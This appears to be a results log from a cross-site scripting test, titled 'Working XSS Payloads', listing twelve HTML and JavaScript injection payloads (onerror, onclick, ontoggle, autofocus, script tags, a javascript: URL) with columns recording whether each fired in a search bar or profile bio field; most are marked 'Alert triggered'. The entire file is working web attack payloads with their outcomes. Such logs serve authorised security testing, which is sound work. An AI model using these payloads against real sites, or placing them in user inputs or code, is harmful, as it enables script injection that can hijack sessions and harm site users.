# Working XSS Payloads - 2025-06-25 22:10:49.098376
# Payload | Expected Behavior | Actual Behavior | Context | Test Context
"><img src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (img with onerror) | search_bar
%3Cimg%20src=x%20onerror=alert(1)%3E | Alert expected | Manual testing required | High likelihood in search bar (img with onerror) | search_bar
<audio src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (audio with onerror) | search_bar
<button onclick=alert(1)>Click</button> | Alert expected | Alert triggered | High likelihood in search bar (button with onclick) | search_bar
<details open ontoggle=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (details with ontoggle) | search_bar
<img src=invalid onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (img with onerror) | search_bar
<img src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (img with onerror) | search_bar
<script>alert(1)</script> | Alert expected | Manual testing required | Moderate likelihood in profile_bio (scripts may be allowed) | profile_bio
<select onchange=alert(1)> | Alert expected | Manual testing required | High likelihood in search bar (select with onchange) | search_bar
<textarea onfocus=alert(1) autofocus> | Alert expected | Alert triggered | High likelihood in search bar (textarea with onfocus) | search_bar
<video src=x onerror=alert(1)> | Alert expected | Alert triggered | High likelihood in search bar (video with onerror) | search_bar
javascript:alert(document.location) | Alert expected | Manual testing required | Moderate likelihood, test in profile_bio (unknown context) | profile_bio
